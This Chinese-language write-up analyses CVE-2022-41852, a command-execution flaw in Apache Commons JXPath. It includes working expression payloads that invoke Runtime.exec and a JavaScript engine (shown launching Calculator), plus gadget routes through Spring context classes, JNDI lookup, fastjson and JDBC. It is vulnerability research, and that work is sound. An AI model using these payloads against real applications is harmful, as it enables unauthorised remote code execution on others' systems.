浅析Apache Commons Jxpath命令执⾏分
析(CVE-2022-41852)
影响版本
commons-jxpath:commons-jxpath <= 1.3
⼀直到最新版本，官⽅也不打算修了
利⽤探索
测试环境：jxpath1.3
JXPath⽀持标准的XPath函数，开箱即⽤。它还⽀持 "标准 "扩展函数，这些函数基本上是通往
Java的桥梁，以及完全⾃定义的扩展函数。
简单从漏洞描述可以看出由于解析xpath表达式的问题造成的漏洞
其实这来源官⽅的⼀个feature，如图看起来它赋予了我们⼀种动态执⾏代码的能⼒
这时候我们就会想为什么会有这种奇怪的需求，毕竟从平时经验来讲xpath，作为⼀种路径语
⾔，它的功能是帮助我们对xml进⾏⼀些简单的信息检索，然⽽它叫JXpath⽽不叫Xpath，因此
其实从实现上来讲它不仅实现了xpath查询的⼀些基础功能，更重要的是它搭建了⼀个通往
java的桥梁，从官⽅的设计初衷也可以看出，它的设计实现其实更像⼀款表达式语⾔
Primary applications of JXPath are in scripting: JSP and similar template/script based 
technologies. However, programmers who prefer XML-flavored APIs, should consider JXPath 
as an alternative to other expression languages as well. JXPath is a must-have tool for those 
who work with mixtures of Java objects and XML and need to frequently traverse through 
graphs of those.
简单的测试
简单写个测试demo
Test.java
Calc.java
对于如何解析其实很多时候我们并不需要去关注对字符token的解析过程，毕竟我们这也不是
绕waf，我们也不需要知道如何去实现⼀些畸形构造达到⼀致的功能，⽽在这⾥我们更应该关
注什么呢？我们应该关注它官⽹这个feature如何实现的调⽤，以及调⽤⽅法对⽅法又有什么限
制？
在 org.apache.commons.jxpath.PackageFunctions#getFunction 当中
import org.apache.commons.jxpath.JXPathContext;
public class Test {
    public static void main(String[] args) {
        JXPathContext context = JXPathContext.newContext(null);
        context.getValue("com.example.springdemo.calc.calc()");
    }
}
package com.example.springdemo;
public class calc {
    public static void calc(){
        try {
            Runtime.getRuntime().exec("open -na Calculator");
        }catch (Exception e ){
        }
    }
}
这⾥可以看出允许的调⽤⼀个是构造函数，另⼀个是静态⽅法，当然他们都需要是public修饰
再次回
到 org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue 当
中,
在获得了org.apache.commons.jxpath.Function对应的这个实例后，回去调⽤具体的invoke的实现
⽽Function具体的接⼜实现有两个类
org.apache.commons.jxpath.functions.ConstructorFunction
org.apache.commons.jxpath.functions.MethodFunction
如何判断返回的是哪个类？
ConstructorFunction 的 invoke 就不多说了，实例化构造函数，另⼀
个 MethodFunction#invoke ，反射执⾏⽅法，都没什么好说的
那么我们假设就从官⽅的demo出发，我们能做些什么？
对于实例化我们能做什么
⽐如说对于new这个操作来说，⼀些常见的如spring当中有两个类构造函数就能加载远程配置
可以rce
org.springframework.context.support.ClassPathXmlApplicationContext
org.springframework.context.support.FileSystemXmlApplicationContext
对于静态⽅法我们能做什么
jndi当中有静态⽅法，javax.naming.InitialContext.doLookup
⼀些常见库⽐如fastjson出发json反序列化
当然还有jdbc攻击也可以帮助我们撕开⼀条漏洞的⼜⼦
当然肯定还有其他的攻击⼿法毕竟jre当中有很多类这⾥只是举⼀些例⼦⽽已，对于学习⾜够
了
想要更多？
拿着tabby编译扫⼀下就⾏，毕竟在这⾥我们规则很简单构造函数、静态⽅法，只是筛选可能
会费点时间罢了
突破限制
对于⼤多数⼈来说，其实想到上⾯⼏点就已经很不错了，但是考虑的也不够全⾯。毕竟⾯
向官⽅feature学习，下个断点，随便点点，也确实差不多了。
对我们来说虽然⽤spirng开发的项⽬很多，但是我们也不⼀定能遇到spring的环境，也不⼀
定有jdbc可以打。
⽽对于JXpath来说，虽然设计的像表达式，但它却不像其他表达式引擎那般灵活，⽀持随意
赋值然后调⽤。也不能多条语句执⾏，它⼀次只能执⾏⼀条，怎么办呢？事实上如果你仔细
看了最后⼀个demo你会发现有个长这样的
从英⽂来看其实就是$book.getAuthorsFirstName()，就是这么的简单。稍微会点Java的你可能也
该想到
如果我们想要执⾏ Runtime.getRuntime().exec("open -na Calculator") ，按照上⾯
的例⼦其实就改为了 exec(java.lang.Runtime.getRuntime(),'open -na 
Calculator')
又或者我们利⽤ScriptEngineManager调⽤js实现rce
eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.
lang.Runtime.getRuntime().exec("open -na Calculator")')
⽅法也便多了起来，有时候多往下⾯看看，真的可以节约很多时间，不然就需要仔细看看字
符串的解析流程，属实⽆趣。
String firstName = (String)context.getValue("getAuthorsFirstName($book)");
//As you can see, the target of the method is specified as the first 
parameter of the function.